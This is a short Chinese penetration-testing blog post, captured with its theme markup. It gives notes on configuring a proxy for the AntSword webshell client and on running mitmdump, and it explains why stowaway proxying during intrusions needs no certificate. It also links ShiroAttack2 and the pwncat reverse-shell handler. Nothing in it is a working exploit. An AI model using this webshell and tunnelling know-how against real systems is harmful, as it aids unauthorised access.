+<p>尽管蚁剑配置代理<img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/51c95d4660efec808d025135eddcb5d6.png"></p>
+<p>测试公网不成功，但连码还是可以，这是因为咱们一般靶场都是http，公网是https,测试链接靶场是可以成功的。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/0d4b050ae976b74ad5f2de51c4d00b6e.png"></p>
+<p>蚁剑连不上本地可能是防火墙没关<img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/6c2e37cdfd3242011b2f2afa6e0705fc.png"></p>
+<blockquote>
+<p><code>mitmdump -p 8089</code></p>
+<p>本地起个代理服务器后</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/d8d5d867d46f021c7232145326f07da1.png"></p>
+<p>用mitmdump确实需要配置代理，因为他就像bp一样会劫持/解密 https 流量，所以你浏览器要配置证书。我来讲一下为啥渗透中不用配置证书：因为我们stowaway用http代理、socks代理的话。stowaway 的 HTTP 代理只做流量转发，不做中间人解密。SOCKS 代理本身就是纯转发协议，也不用配置证书。所以实际上浏览器会直接和目标网站建立 TLS 加密连接，不会有中间人解析这个包看看，再自己加密</p>
+<hr>
+<p>[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/johnnyzen/p/17880870.html">Git] 一次搞定：Github 2FA(Two-Factor Authentication/两因素认证) - 千千寰宇 - 博客园</a>d</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/SummerSec/ShiroAttack2/issues/41">报错：找不到或无法加载主类 com.summersec.attack.UI.Main · Issue #41 · SummerSec/ShiroAttack2</a>d</p>
+<p>听说这个pwn工具挺好用的</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/calebstewart/pwncat">calebstewart/pwncat: Fancy reverse and bind shell handler</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/306294.html">pwncat：功能强大的反向Shell&amp;BindShell处理工具 - FreeBuf网络安全行业门户</a></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">q1n9</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://lingqing777.github.io/2025/02/13/pwncat/">https://lingqing777.github.io/2025/02/13/pwncat/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">q1n9</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E6%9D%82/">
+                                    <span class="chip bg-color">杂</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2025/02/25/qqqqq-000380-week1-wp/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="hgame">
+                        
+                        <span class="card-title">hgame</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2025-02-25
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E7%BD%91%E5%AE%89/" class="post-category">
+                                    网安
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf/">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                    <a href="/tags/wp/">
+                        <span class="chip bg-color">wp</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2025/01/25/di-yi-ye/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="buuctf">
+                        
+                        <span class="card-title">buuctf</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-01-25
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E7%BD%91%E5%AE%89/" class="post-category">
+                                    网安
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf/">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                    <a href="/tags/wp/">
+                        <span class="chip bg-color">wp</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2025</span>
+            
+            <a href="/about" target="_blank">q1n9</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">113.1k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/lingqing777" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1625684832@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1625684832" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1625684832" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+
+    <!-- 雪花特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
